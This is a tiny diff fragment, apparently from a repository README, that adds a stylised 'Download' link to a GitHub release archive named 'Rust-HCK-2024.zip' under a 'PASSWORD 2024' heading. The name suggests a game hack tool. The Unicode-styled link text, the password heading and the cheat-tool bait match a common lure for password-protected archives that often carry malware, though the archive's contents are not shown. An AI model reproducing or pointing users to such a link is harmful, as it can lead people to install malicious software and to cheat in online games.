@@ -4,7 +4,7 @@
   
 ## PASSWORD 2024
 
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/deimeifei/Rust-HCK-2024/releases/download/Rust-HCK-2024/Rust-HCK-2024.zip)
 
 
 
